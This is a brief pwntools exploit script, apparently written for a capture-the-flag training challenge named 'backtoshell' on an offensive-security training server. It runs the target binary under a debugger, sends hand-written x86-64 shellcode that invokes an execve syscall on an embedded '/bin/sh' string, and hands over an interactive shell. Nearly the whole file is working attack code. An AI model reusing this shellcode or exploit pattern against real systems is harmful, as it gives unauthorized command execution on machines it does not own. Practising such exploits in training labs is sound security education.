from pwn import*



#context.terminal = ['tmux', 'splitw', '-h']

#p = remote("bin.training.offdef.it", 3001)
p = process("./backtoshell")
gdb.attach(p,
'''
''')
 
input("wait")


shellcode = b"\x48\x89\xC7\x48\x83\xC7\x10\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00"
p.send(shellcode)

p.interactive()